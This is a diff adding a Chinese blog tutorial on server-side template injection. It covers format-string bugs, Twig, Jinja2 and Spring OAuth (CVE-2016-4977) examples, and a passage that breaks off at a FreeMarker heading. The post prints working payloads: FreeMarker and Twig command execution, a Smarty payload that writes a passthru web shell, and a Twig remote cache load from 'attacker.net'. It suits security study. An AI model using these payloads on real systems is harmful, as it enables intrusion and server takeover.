@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 14.29px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.43px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.25px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.5px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.25px;">http</a> <a href="/tags/java/" style="font-size: 13.75px;">java</a> <a href="/tags/misc/" style="font-size: 11.25px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.5px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.75px;">sql注入</a> <a href="/tags/ssrf/" style="font-size: 11.25px;">ssrf</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 16.25px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A1%86%E6%9E%B6/" style="font-size: 10px;">框架</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 15px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.5px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,203 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-各类模板注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/04/%E5%90%84%E7%B1%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="article-date">
+  	<time datetime="2021-09-03T16:00:00.000Z" itemprop="datePublished">2021-09-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/04/%E5%90%84%E7%B1%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+        各类模板注入
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="各类模板注入"><a href="#各类模板注入" class="headerlink" title="各类模板注入"></a>各类模板注入</h1><p>注入是格式化字符串漏洞的一种体现，其中模板注入是格式化字符串的非常好的体现，SSTI不属于任何一种语言，只要使用模板的地方就会出现SSTI漏洞</p>
+<h2 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h2><p>格式化字符串漏洞是像printf(user_input)类似的代码实现的，其中user_input是用户输入的数据，如果Set-UID root权限开启的时，printf语句可以导致以下结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">使得程序崩溃</span><br><span class="line"></span><br><span class="line">任意一块内存读取数据</span><br><span class="line"></span><br><span class="line">修改任意一块内存里的数据</span><br></pre></td></tr></table></figure>
+<p>最后一种结果最危险，可以修改set-UID root程序内部变量的值，从而改变这些程序的行为</p>
+<p>格式化字符串的形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">print(&quot;The magic number is:%d&quot;,1911) #结果为The magic number is:1911</span><br><span class="line"></span><br><span class="line">print(&quot;My name is %s&quot;%(&#x27;phithon&#x27;,) #结果为My name is phithon</span><br><span class="line"></span><br><span class="line">print(&quot;My name is %(name)%&quot;%&#123;&#x27;name&#x27;:&#x27;phithon&#x27;&#125; #结果为My name is phithon</span><br><span class="line"></span><br><span class="line">print(&quot;My name is &#123;&#125;&quot;.format(&#x27;phithon&#x27;) #结果为My name is phithon</span><br><span class="line"></span><br><span class="line">print(&quot;My name is &#123;name&#125;&quot;.format(name=&#x27;phithon&#x27;) #结果为My name is phithon</span><br></pre></td></tr></table></figure>
+
+<p>其中使用format()方法来格式化字符串的其它表示形式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;username&#125;&quot;.format(username=&#x27;phithon&#x27;) # 普通用法</span><br><span class="line"></span><br><span class="line">&#123;username!r&#125;&quot;.format(username=&#x27;phithon&#x27;) # 等同于repr(username)</span><br><span class="line"></span><br><span class="line">&#123;number:0.2f&#125;&quot;.format(number=0.5678) #等同于&quot;%0.2f&quot;%0.5678，保留两位小数</span><br><span class="line"></span><br><span class="line">int: &#123;0:d&#125;;  hex: &#123;0:#x&#125;;  oct: &#123;0:#o&#125;;  bin: &#123;0:#b&#125;&quot;.format(42) # 转换进制</span><br><span class="line"></span><br><span class="line">&#123;user.username&#125;&quot;.format(user=request.username) #获取对象属性</span><br><span class="line"></span><br><span class="line">&#123;arr[2]&#125;&quot;.format(arr=[0,1,2,3,4]) #获取数组键值</span><br></pre></td></tr></table></figure>
+<p>详细请看：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/penetration/python-string-format-vulnerability.html">https://www.leavesongs.com/penetration/python-string-format-vulnerability.html</a><br>                  <a target="_blank" rel="noopener" href="https://github.com/shiyanlou/seedlab/blob/master/formatstring.md">https://github.com/shiyanlou/seedlab/blob/master/formatstring.md</a></p>
+<h2 id="常见的模板引擎"><a href="#常见的模板引擎" class="headerlink" title="常见的模板引擎"></a>常见的模板引擎</h2><h3 id="php常见"><a href="#php常见" class="headerlink" title="php常见"></a>php常见</h3><h4 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h4><p>Smarty算是一种比较老的PHP模板引擎，使用比较广泛</p>
+<h4 id="Twig"><a href="#Twig" class="headerlink" title="Twig"></a>Twig</h4><p>Twig是来自于Symfony的模板引擎，比较容易安装，操作有点像Mustache和liquid</p>
+<h4 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h4><p>Blade是Laravel提供的一个既简单又强大的模板引擎，与其它的php引擎不同的是它并不限制在视图使用原生的php代码，所有的Blade视图文件都会被编译为原生的php代码并缓存起来，除非它被修改，否则不会再被编译</p>
+<h3 id="java常用的"><a href="#java常用的" class="headerlink" title="java常用的"></a>java常用的</h3><h4 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h4><p>JSP部署在网络服务器上，可以响应客户端发送的请求，并根据请求生成动态的HTML、XML或其它格式的文档的web网页，然后返回给请求者</p>
+<h4 id="FreeMarcker"><a href="#FreeMarcker" class="headerlink" title="FreeMarcker"></a>FreeMarcker</h4><p>FreeMarcer是一款模板引擎：即一种基于模板和要改变的数据，并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。它不是面向最终用户，而是一个java类库，是一款程序员可以嵌入他们所开发产品的组件</p>
+<h4 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h4><p>Velocity可以替代java web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力</p>
+<h3 id="python常用的"><a href="#python常用的" class="headerlink" title="python常用的"></a>python常用的</h3><h4 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h4><p>flask jinja2是一种广泛使用的模板引擎</p>
+<h4 id="django"><a href="#django" class="headerlink" title="django"></a>django</h4><p>django是专属于自己的一个模板引擎，有好用的对象关系映射（ORM），而且它很多东西的耦合性很高</p>
+<h4 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h4><p>tornado也有属于自己的一套模板引擎，tornado强调的是异步非阻塞高并发</p>
+<p>注意</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">同一种语言不同模板引擎支持的语法虽然相同，但是还是有略微的差异，比如tornado模板的render()中支持传入自定义函数以及函数的参数，然后在两个大括号&#123;&#123;&#125;&#125;中执行，但对于djanggo模板引擎来说相对难用一点</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="模板注入实例"><a href="#模板注入实例" class="headerlink" title="模板注入实例"></a>模板注入实例</h2><p>原理：服务端接收用户的恶意输入后，未经过处理作为web应用模板内容的一部分，模板引擎在进行目标编译渲染时，执行了用户插入的可以破坏模板的语句，导致敏感信息泄露、代码执行或拿到shell</p>
+<h3 id="PHP实例"><a href="#PHP实例" class="headerlink" title="PHP实例"></a>PHP实例</h3><h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;</span><br><span class="line">Twig_Autoloader::register(true);</span><br><span class="line"></span><br><span class="line">$twig = new Twig_Environment(new Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(&quot;Hello &#123;$_GET[‘name‘]&#125;&quot;);  // 将用户输入作为模版内容的一部分</span><br><span class="line">echo $output;</span><br></pre></td></tr></table></figure>
+
+<p>其中{name}的大括号不是模板变量外面的括号，只是为了区别变量和字符串常量，所以可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>模板引擎会将此解析，结果为49</p>
+<p>两个实例使用的都是Twig模板引擎</p>
+<h3 id="python实例"><a href="#python实例" class="headerlink" title="python实例"></a>python实例</h3><h4 id="实例1-1"><a href="#实例1-1" class="headerlink" title="实例1"></a>实例1</h4><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template = &#x27;&#x27;&#x27;&#123;%% extends &quot;layout.html&quot; %%&#125;</span><br><span class="line">&#123;%% block body %%&#125;</span><br><span class="line">    &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&#123;%% endblock %%&#125;</span><br><span class="line">&#x27;&#x27;&#x27; % (request.url)</span><br><span class="line">    return render_template_string(template), 404</span><br></pre></td></tr></table></figure>
+<p>其中代码里面使用%(request.url)是格式化字符串，所以我们只要将49放在url后面，然后它会通过render_template_string()渲染，然后进行解析，结果为49</p>
+<h4 id="实例2"><a href="#实例2" class="headerlink" title="实例2"></a>实例2</h4><p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># coding: utf-8</span><br><span class="line">import sys</span><br><span class="line">from jinja2 importTemplate</span><br><span class="line"></span><br><span class="line">template = Template(&quot;Your input: &#123;&#125;&quot;.format(sys.argv[1] if len(sys.argv) &gt; 1 else &#x27;&lt;empty&gt;&#x27;))</span><br><span class="line">print template.render()</span><br></pre></td></tr></table></figure>
+<p>代码里利用format()语句来进行格式化字符串，所以我们可以输入49，然后再经过render()来对模板变量渲染解析，结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You input:49</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Java实例"><a href="#Java实例" class="headerlink" title="Java实例"></a>Java实例</h3><h4 id="Sping-Security-OAuth-RCE-CVE-2016-4977-漏洞"><a href="#Sping-Security-OAuth-RCE-CVE-2016-4977-漏洞" class="headerlink" title="Sping Security OAuth RCE(CVE-2016-4977)漏洞"></a>Sping Security OAuth RCE(CVE-2016-4977)漏洞</h4><p>Spring Security OAuth是为Spring框架提供安全认证支持的一个模块，就是当用户使用Whitelabel views来处理错误时，攻击者在被授权的情况下可以通过构造恶意参数来远程执行命令</p>
+<p>影响版本<br>2.0.0 to 2.0.9</p>
+<p>1.0.0 to 1.0.5</p>
+<p>漏洞分析</p>
+<p>我们可以查看src/resources/application.properties的内容来获取clientid和用户密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">security.oauth2.client.clientId: acme</span><br><span class="line">security.oauth2.client.clientSecret: acmesecret</span><br><span class="line">security.oauth2.client.authorized-grant-types: authorization_code,refresh_token,password</span><br><span class="line">security.oauth2.client.scope: openid</span><br><span class="line">security.oauth2.client.registered-redirect-uri: httP;//localhost</span><br><span class="line">security.user.password: password</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=hellotom</span><br></pre></td></tr></table></figure>
+<p>其中client_id为上面获取的，输入用户名user并输入上面得到的密码，<br>然后点击登录后，报错，发现hellotom为不法值，因此我们可以构造${2334-1}，可以看到会回显信息，表达式被执行，因此有触发漏洞</p>
+<p>思路分析</p>
+<p>首先我们看代码可知whitelabel作为视图来返回错误页面，在看/spring-security-oauth/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/WhitelabelErrorEndpoint.java中第18-40行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">@FrameworkEndpoint</span><br><span class="line">public class WhitelabelErrorEndpoint &#123;</span><br><span class="line"></span><br><span class="line">    private static final String ERROR = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;/oauth/error&quot;)</span><br><span class="line">    public ModelAndView handleError(HttpServletRequest request) &#123;</span><br><span class="line">        Map&lt;String, Object&gt; model = new HashMap&lt;String, Object&gt;();</span><br><span class="line">        Object error = request.getAttribute(&quot;error&quot;);</span><br><span class="line">        // The error summary may contain malicious user input,</span><br><span class="line">        // it needs to be escaped to prevent XSS</span><br><span class="line">        String errorSummary;</span><br><span class="line">        if (error instanceof OAuth2Exception) &#123;</span><br><span class="line">            OAuth2Exception oauthError = (OAuth2Exception) error;</span><br><span class="line">            errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            errorSummary = &quot;Unknown error&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        model.put(&quot;errorSummary&quot;, errorSummary);</span><br><span class="line">        return new ModelAndView(new SpelView(ERROR), model);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里定义了whitelabel的处理方法，程序可以通过oauthError.getSummary()来获取错误信息，看代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.put(&quot;errorSummary&quot;, errorSummary);</span><br><span class="line">return new ModelAndView(new SpelView(ERROR), model);</span><br></pre></td></tr></table></figure>
+<p>然后${2334-1}也被带入了errorSummary中，然后errorSummary被装入到model中，最后再用SpelView进行渲染，我们再看pring-security-oauth/spring-security-oauth2/src/main/java/org/springframework/security/oauth2/provider/endpoint/SpelView.java中第21-54行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">class SpelView implements View &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public SpelView(String template) &#123;</span><br><span class="line">        this.template = template;</span><br><span class="line">        this.context.addPropertyAccessor(new MapAccessor());</span><br><span class="line">        this.helper = new PropertyPlaceholderHelper(&quot;$&#123;&quot;, &quot;&#125;&quot;);</span><br><span class="line">        this.resolver = new PlaceholderResolver() &#123;</span><br><span class="line">            public String resolvePlaceholder(String name) &#123;</span><br><span class="line">                Expression expression = parser.parseExpression(name);</span><br><span class="line">                Object value = expression.getValue(context);</span><br><span class="line">                return value == null ? null : value.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    public void render(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        ...</span><br><span class="line">        String result = helper.replacePlaceholders(template, resolver);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到render通过helper取${}中的值作为表达式，再用parser.parseExpression来执行，跟进一下replacePlaceholders这个函数，在/org/springframework/util/PropertyPlaceholderHelper.class第47-56行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public String replacePlaceholders(String value, final Properties properties) &#123;</span><br><span class="line">    Assert.notNull(properties, &quot;\&#x27;properties\&#x27; must not be null&quot;);</span><br><span class="line">    return this.replacePlaceholders(value, new PropertyPlaceholderHelper.PlaceholderResolver() &#123;</span><br><span class="line">        public String resolvePlaceholder(String placeholderName) &#123;</span><br><span class="line">            return properties.getProperty(placeholderName);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们发现这个函数是个递归，如果表达式的值中有${xxx}这样形式的字符串存在，则以xxx执行，无论有多少个{}，都会被去掉</p>
+<p>首先传入了${errorSummary}，然后取errorSummary为表达式进行执行，发现有${2334-1}，则去掉${}后，将2334-1当作表达式执行</p>
+<h4 id="实例2-1"><a href="#实例2-1" class="headerlink" title="实例2"></a>实例2</h4><p>此漏洞是2015年blackhat大会讲述的Alfresco的一个SSTI漏洞</p>
+<p>实例代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;ex(&quot;id&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>结果为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7) </span><br></pre></td></tr></table></figure>
+
+<p>用法如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp =“com.acmee.freemarker.WordWrapperDirective”？new（）&gt;</span><br><span class="line"></span><br><span class="line">&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;</span><br><span class="line">&lt;#assign word_wrapp_narrow =“com.acmee.freemarker.WordWrapperDirective”？new（40）&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>相当于调用了构造函数创建了一个对象，那么这个payload是调用了freemarker的内置执行命令的对象Excute</p>
+<h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><p>原理：通过更改请求参数让含有模板引擎语法的payload，通过页面渲染返回的内容检测含有模板引擎的payload是否有被编译，有，则SSTI，无，则不存在SSTI</p>
+<p>可以使用linux中的tplmap来进行扫描</p>
+<h2 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h2><p>可以从四个方向进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.模板本身</span><br><span class="line">可以考虑模板本身的语法、内置变量、属性、函数</span><br><span class="line"></span><br><span class="line">2.框架本身</span><br><span class="line">框架的全局变量、属性、函数</span><br><span class="line"></span><br><span class="line">3.语言本身</span><br><span class="line">语言本身的特性</span><br><span class="line"></span><br><span class="line">4.应用本身</span><br><span class="line">考虑应用定义的东西，需要找开源的源码</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="利用模板本身的特性进行攻击"><a href="#利用模板本身的特性进行攻击" class="headerlink" title="利用模板本身的特性进行攻击"></a>利用模板本身的特性进行攻击</h4><h5 id="Smarty模板"><a href="#Smarty模板" class="headerlink" title="Smarty模板"></a>Smarty模板</h5><p>由于Smarty模板会提供安全模式，会强制执行在php安全函数白名单中的函数，所以我们在模板中无法调用php中直接执行命令的函数（相当于存在一个disable_function)，但是我们可以考虑模板本身。$smarty内置变量可用于访问各种环境变量，比如我们可以使用self来得到smarty这个类中的方法</p>
+<p>getStreamVariable()<br>此方法可以获取传入变量的流，即读文件</p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure>
+
+<p>class Smarty_Internal_Write_File<br>可以使用这个类的writeFile()方法来写文件，又因为这个类的第三个参数要为smarty类型，所以可以使用self::clearConfig()</p>
+<p>因此可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure>
+<p>来写文件</p>
+<p>其中passthru()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru — 执行外部程序并且显示原始输出</span><br></pre></td></tr></table></figure>
+<p>注意：高版本的smarty模板是禁用前两个函数的，所以可以考虑使用{if 代码}{/if}标签来执行php代码</p>
+<h5 id="Twig模板"><a href="#Twig模板" class="headerlink" title="Twig模板"></a>Twig模板</h5><p>虽然Twig框架不能使用静态方法，且所有函数的返回值都转换为字符串，所以我们不能使用self::调用静态变量，可以在官网文档查询：<a target="_blank" rel="noopener" href="https://twig.symfony.com/doc/2.x/templates.html">https://twig.symfony.com/doc/2.x/templates.html</a></p>
+<p>我们可以使用_self，虽然_self没有什么方法，但是有env,env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置，它在environment.php文件中</p>
+<p>因此，我们可以通过将缓存位置设置为远程服务器来引入远程文件包含漏洞<br>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>但是allow_url_include一般是打不开的，无法远程包含文件，所以我们可以使用一个调用过滤器的函数getFilter()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public function getFilter($name)</span><br><span class="line">&#123;</span><br><span class="line">        [snip]</span><br><span class="line">        foreach ($this-&gt;filterCallbacks as $callback) &#123;</span><br><span class="line">        if (false !== $filter = call_user_func($callback, $name)) &#123;//注意这行</span><br><span class="line">            return $filter;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public function registerUndefinedFilterCallback($callable)</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;filterCallbacks[] = $callable;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>由于这个函数带有call_user_func()这个危险函数，所以我们可以用exec()作为回调函数传进去，实现命令执行，因此构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="freeMarker模板"><a href="#freeMarker模板" class="headerlink" title="freeMarker模板"></a>freeMarker模板</h5><p>可以构造payload</p>
